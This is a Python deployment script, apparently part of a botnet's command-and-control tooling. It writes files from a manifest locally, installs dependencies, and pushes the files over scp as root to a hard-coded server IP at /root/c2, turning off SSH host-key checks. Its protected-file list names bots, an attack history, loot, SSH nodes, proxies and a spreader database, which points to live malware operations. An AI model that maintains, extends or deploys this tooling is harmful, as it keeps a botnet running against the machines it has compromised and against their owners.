import json
import os
import sys
import subprocess
import pkg_resources

MANIFEST_FILE = "manifest.json"
PROTECTED_FILES = {
    "bots.json",
    "attack_history.db",
    "secrets.json",
    "avz_state.json",
    "attack_profiles.json",
    "ssh_nodes.json",
    "avz.log",
    "loot/",
    "proxy_list.json",
    "spreader_learn.db"
}

VPS_HOST = "80.249.146.202"
VPS_USER = "root"
VPS_PATH = "/root/c2"
SSH_KEY = os.path.expanduser("~/.ssh/avz_vps")

def install_missing_dependencies(requirements_file="requirements.txt"):
    if not os.path.exists(requirements_file):
        print("[!] requirements.txt не найден")
        return
    with open(requirements_file, "r") as f:
        required_packages = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    missing = []
    for package in required_packages:
        try:
            pkg_resources.require(package)
        except (pkg_resources.DistributionNotFound, pkg_resources.VersionConflict):
            missing.append(package)
    if missing:
        print(f"[+] Установка недостающих пакетов: {', '.join(missing)}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade"] + missing)
        print("[+] Все зависимости установлены")
    else:
        print("[✓] Все зависимости уже установлены")

def apply_manifest():
    if not os.path.exists(MANIFEST_FILE):
        print("[!] manifest.json не найден")
        return []

    with open(MANIFEST_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)

    files = data.get("files", [])
    updated = []
    for entry in files:
        path = entry["path"]
        content = entry["content"]

        if path in PROTECTED_FILES:
            print(f"[✓] Пропущен защищённый файл: {path}")
            continue

        dir_path = os.path.dirname(path)
        if dir_path and not os.path.exists(dir_path):
            os.makedirs(dir_path, exist_ok=True)

        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"[+] Обновлён: {path}")
        updated.append(path)

    install_missing_dependencies("requirements.txt")
    print("[✓] Локальное обновление завершено.")
    return updated

def deploy_to_vps(updated_files):
    if not os.path.exists(SSH_KEY):
        print("[!] SSH-ключ не найден. Деплой на VPS пропущен.")
        return
    print("[+] Деплой на VPS...")
    for file_path in updated_files:
        if file_path.startswith("deploy/"):
            remote_path = file_path.replace("deploy/", "")
            remote_dir = os.path.join(VPS_PATH, os.path.dirname(remote_path))
            cmd = f"scp -i {SSH_KEY} -o StrictHostKeyChecking=no deploy/{remote_path} {VPS_USER}@{VPS_HOST}:{remote_dir}/"
        elif file_path.startswith("services/"):
            remote_path = file_path.replace("services/", "")
            remote_dir = os.path.join(VPS_PATH, os.path.dirname(remote_path))
            cmd = f"scp -i {SSH_KEY} -o StrictHostKeyChecking=no services/{remote_path} {VPS_USER}@{VPS_HOST}:{remote_dir}/"
        else:
            remote_dir = os.path.join(VPS_PATH, os.path.dirname(file_path))
            cmd = f"scp -i {SSH_KEY} -o StrictHostKeyChecking=no {file_path} {VPS_USER}@{VPS_HOST}:{remote_dir}/"
        subprocess.run(cmd, shell=True, capture_output=True)
        print(f"[VPS] Загружен: {file_path}")
    subprocess.run(f"scp -i {SSH_KEY} -o StrictHostKeyChecking=no -r web_dashboard {VPS_USER}@{VPS_HOST}:{VPS_PATH}/web_dashboard", shell=True, capture_output=True)
    print("[VPS] Папка web_dashboard синхронизирована")
    restart_cmd = f"ssh -i {SSH_KEY} -o StrictHostKeyChecking=no {VPS_USER}@{VPS_HOST} 'pkill python3; cd {VPS_PATH} && python3 deploy/server.py &'"
    subprocess.run(restart_cmd, shell=True, capture_output=True)
    print("[VPS] Сервер перезапущен")

if __name__ == "__main__":
    updated = apply_manifest()
    if updated:
        deploy_to_vps(updated)
        print("[✓] Деплой на VPS завершён.")
